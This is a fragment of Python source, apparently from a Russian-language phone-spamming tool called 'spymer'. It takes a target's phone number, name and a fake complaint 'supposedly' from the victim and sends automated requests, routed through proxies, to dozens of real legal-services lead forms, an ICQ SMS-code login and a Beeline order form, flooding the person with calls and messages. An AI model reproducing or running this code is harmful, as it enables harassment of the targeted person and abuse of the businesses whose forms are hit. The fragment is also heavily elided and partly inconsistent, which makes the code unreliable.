            ...
            if input1 == "1":
                ...
                if input11 == "3":
                    try:
                        ...
                        print(
                            Fore.GREEN
                            + "http://FSystem88.ru/spymer/\n"
                            + Style.RESET_ALL
                        )
                        token = input(Fore.BLUE + "spymer > " + Style.RESET_ALL)
                        id = requests.post(
                            "https://fsystem88.ru/spymer/spym.php",
                            data={"token": token},
                        ).json()["id"]
                        if int(id) != 0:
                            os.system("rm -rf ~/spymer/{}".format(token))
                            os.system(
                                "wget -P ~/spymer/ https://fsystem88.ru/spymer/token/{}".format(
                                    token
                                )
                            )
                            os.system("cd ~/spymer")
                                            ...
                                            for phone in array:
                                                try:
                                                    if int(phone):
                                                        ...
                                                        print(info)
                                                        id = requests.post(
                                                            "https://fsystem88.ru/spymer/json.php",
                                                            data={"phone": _phone},
                                                        ).json()["id"]
                                                        if int(id) > 0:
                                                            print(
                                                                Fore.RED
                                                                + "\nНомер телефона {} находится в антиспам листе.\nПриступаю к следующему номеру.".format(
                                                                    phone
                                                                )
                                                                + Style.RESET_ALL
                                                            )
                                                            ...
                                                            try:
                                                                ...
                                                                try:
                                                                    requests.post(
                                                                        "https://icq.com/smscode/login/ru",
                                                                        data={
                                                                            "msisdn": _phone
                                                                        },
                                                                        proxies=proxies,
                ...
                try:
                    if int(phone):
                        ...
                        if int(id) > 0:
                            ...
                            result = requests.post(
                                "https://fsystem88.ru/spymer/ajax.php",
                                data={"phone": phone},
                            ).json()["result"]
                            if result == "no":
                                info = (
                    ...
                    info = (
                        Fore.RED
                        + "\nНекорректно введен телефон!".format(phone)
                        + Style.RESET_ALL
                    )
                    ...
                    try:
                        if int(phone):
                            ...
                            if name == "":
                                ...
                                main()
                            print(
                                "Введите жалобу (обращение, которое потерпевший якобы адресует адвокатам):"
                            )
                            text = input(Fore.BLUE + "spymer > " + Style.RESET_ALL)
                            if text == "":
                                info = (
                                    Fore.RED
                                    + "\nНекорректно введена жалоба!"
                                    + Style.RESET_ALL
                                )
                                main()
                            try:
                                ...
                                if int(id) > 0:
                                    info = (
                                        Fore.RED
                                        + "\nТелефон находится в антиспам листе."
                                        + Style.RESET_ALL
                                    )
                                    main()
                                elif int(id) == 0:
                                    ...
                                    info = "Телефон: {}\nИмя: {}\nЖалоба: {}\nСпамер запущен.\nДля отмены нажмите Ctrl+C".format(
                                        phone, name, text
                                    )
                                    os.system("cls" if os.name == "nt" else "clear")
                                    print(logo)
                                    ...
                                    try:
                                        try:
                                            ...
                                            if vodaonline.status_code == 200:
                                                print(
                                                    Fore.GREEN
                                                    + "www.vodaonline.ru: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED
                                                    + "www.vodaonline.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            yurmoscow = requests.post(
                                                "https://yur-moscow.ru/ajax_call_me.php",
                                                data={
                                                    "param1": _phone,
                                                    "param3": _text,
                                                    "param2": _name,
                                            ...
                                            if yurmoscow.status_code == 200:
                                                print(
                                                    Fore.GREEN + "yur-moscow.ru: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED + "yur-moscow.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            bukvaprava = requests.post(
                                                "https://bukvaprava.ru/wp-admin/admin-ajax.php",
                                                data={
                                                    "text_quest_banner": _text,
                                                    "name": _name,
                                                    "city": "Москва",
                                                    "tel": _phoneBukvaprava,
                                                    "ip": "192.168.1.777",
                                                    "form_page": "https://bukvaprava.ru/",
                                                    "referer": "",
                                                    "action": "ajax-lead",
                                                },
                                                proxies=proxies,
                                            ...
                                            if bukvaprava.status_code == 200:
                                                print(
                                                    Fore.GREEN + "bukvaprava.ru: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED + "bukvaprava.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            yuristonline = requests.post(
                                                "https://www.yurist-online.net/lead_question",
                                                data={
                                                    "region": "27",
                                                    "question": _text,
                                                    "name": _name,
                                            ...
                                            if yuristonline.status_code == 200:
                                                print(
                                                    Fore.GREEN
                                                    + "www.yurist-online.net: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED
                                                    + "www.yurist-online.net: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            blablabla = requests.post(
                                                "http://xn----8sbgev0cabfflr7k.xn--p1ai/scripts/form-u22118.php",
                                                data={
                                                    "custom_U22127": _phoneVodaonline
                                                },
                                                proxies=proxies,
                                            )
                                            if blablabla.status_code == 200:
                                                print(
                                                    Fore.GREEN
                                                    + "юрист-авгрупп.рф: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED
                                                    + "юрист-авгрупп.рф: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            nicecream = requests.post(
                                                "http://s1.nice-cream.ru/phone-widget2/sendRequest.php",
                                                data={
                                                    "phone": "+" + _phone,
                                                    "name": _name,
                                                    "sid": "*",
                                            ...
                                            if nicecream.status_code == 200:
                                                print(
                                                    Fore.GREEN + "nice-cream.ru: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED + "nice-cream.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            rossovet = requests.post(
                                                "https://rossovet.ru/qa/msgsave/save",
                                                data={
                                                    "name": _name,
                                                    "comment": _text,
                                                    "city": "Москва",
                                            ...
                                            if rossovet.status_code == 200:
                                                ...
                                                print(
                                                    Fore.RED + "rossovet.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            yuridkons = requests.post(
                                                "https://yuridicheskaya-konsultaciya.com/Home/_FormPost",
                                                data={
                                                    "Name": _name,
                                                    "Phone": _phone,
                                                    "Description": _text,
                                            ...
                                            if yuridkons.status_code == 200:
                                                print(
                                                    Fore.GREEN
                                                    + "yuridicheskaya-konsultaciya.com: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED
                                                    + "yuridicheskaya-konsultaciya.com: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            epleads = requests.post(
                                                "https://epleads.ru/gate/api.php",
                                                data={
                                                    "question": _text,
                                                    "region": "Москва",
                                                    "first_last_name": _name,
                                                    "phone": _phone,
                                                    "ofrid": "1",
                                                    "wid": "3",
                                                    "presetid": "4",
                                            ...
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            pravonedv = requests.post(
                                                "https://pravonedv.ru/proxy_8d34201a5b.php?a___=1",
                                                data={
                                                    "email": _email + "@mail.ru",
                                                    "phone": _phoneVodaonline,
                                            ...
                                            if pravonedv.status_code == 200:
                                                ...
                                                print(
                                                    Fore.RED + "pravonedv.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            ...
                                            if rdftgbhnj.status_code == 200:
                                                print(
                                                    Fore.GREEN + "гос-юристы.рф: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED + "гос-юристы.рф: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            gurist = requests.post(
                                                "http://www.gurist.ru/wp-json/contact-form-7/v1/contact-forms/3591/feedback",
                                                data={
                                                    "_wpcf7": "3591",
                                                    "_wpcf7_version": "5.0",
                                                    "_wpcf7_locale": "ru_RU",
                                                    "_wpcf7_unit_tag": "wpcf7-f3591-o1",
                                                    "_wpcf7_container_post": "0",
                                                    "your-name": _name,
                                                    "tel-147": _text,
                                                },
                                            ...
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            beeline = requests.post(
                                                "https://moskva.beeline.ru/customers/products/mobile/services/createmnporder/",
                                                data={
                                                    "leadName": "PodborSim",
                                                    "phone": _phone[1:11],
                                                    "region": "98140",
                                            ...
                                            if beeline.status_code == 200:
                                                print(
                                                    Fore.GREEN
                                                    + "moskva.beeline.ru: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED
                                                    + "moskva.beeline.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            advokatmakeev = requests.post(
                                                "https://advokatmakeev.ru/form.php",
                                                data={
                                                    "oname": _name,
                                                    "otel": _phoneVodaonline,
                                                    "omail": "",
                                                    "omess": _text,
                                                    "otype": "1",
                                                },
                                            ...
                                            if advokatmakeev.status_code == 200:
                                                print(
                                                    Fore.GREEN
                                                    + "advokatmakeev.ru: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED
                                                    + "advokatmakeev.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            mkamsk = requests.post(
                                                "http://mkamsk.ru/apply_auto_form",
                                                data={
                                                    "Form[9]": _name,
                                                    "Form[12]": _phone,
                                                    "Form[11]": _text,
                                            ...
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            usachev = requests.post(
                                                "https://usachev.vip/wp-admin/admin-ajax.php",
                                                data={
                                            ...
                                            if usachev.status_code == 200:
                                                ...
                                                print(
                                                    Fore.RED + "usachev.vip: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            pravosfera = requests.post(
                                                "http://pravo-sfera.ru/auxpage_zayavk/",
                                                data={
                                                    "c_name": _name,
                                                    "c_tel": _phoneVodaonline,
                                                    "quest": _text,
                                            ...
                                            if usachev.status_code == 200:
                                                print(
                                                    Fore.GREEN + "pravo-sfera.ru: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED
                                                    + "pravo-sfera.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            uristexpert24 = requests.post(
                                                "https://urist-expert24.ru/send-lead/",
                                                data={
                                                    "name": _name,
                                                    "phone": _phoneVodaonline,
                                            ...
                                            if uristexpert24.status_code == 200:
                                                print(
                                                    Fore.GREEN
                                                    + "urist-expert24.ru: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED
                                                    + "urist-expert24.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            lawdivorce = requests.post(
                                                "http://law-divorce.ru/wp-admin/admin-ajax.php",
                                                data={
                                                    "ip_address": "",
                                                    "ip_country": "",
                                                    "ip_region": "",
                                                    "ip_city": "",
                                                    "url": "",
                                                    "action": "lld_send_lead",
                                                    "text": _text,
                                                    "name": _name,
                                                    "telephone": "+" + _phoneBukvaprava,
                                                    "city": "Москва",
                                                },
                                                proxies=proxies,
                                            )
                                            if lawdivorce.status_code == 200:
                                                print(
                                                    Fore.GREEN + "law-divorce.ru: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED
                                                    + "law-divorce.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            gosurist = requests.post(
                                                "http://www.gos-urist.ru/send.php",
                                                {
                                                    "name": _name,
                                                    "code": _phone[1:4],
                                                    "phone": _phone[4:11],
                                            ...
                                            if gosurist.status_code == 200:
                                                print(
                                                    Fore.GREEN
                                                    + "www.gos-urist.ru: sent"
                                                )
                                            else:
                                                print(
                                                    Fore.RED
                                                    + "www.gos-urist.ruчё: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            ur9911030 = requests.post(
                                                "http://9911030.ru/orderform.php",
                                                {
                                                    "name": _name,
                                                    "phone": _phone,
                                                    "message": _text,
                                            ...
                                            print(Fore.RED + "SERVICE DIED")
                                        try:
                                            findclone = requests.get(
                                                "https://findclone.ru/register?phone=+"
                                                + _phone,
                                                params={"phone": "+" + _phone},
                                                proxies=proxies,
                                            )
                                            if ur9911030.status_code == 200:
                                                ...
                                                print(
                                                    Fore.RED + "findclone.ru: not sent"
                                                )
                                        except:
                                            print(Fore.RED + "SERVICE DIED")
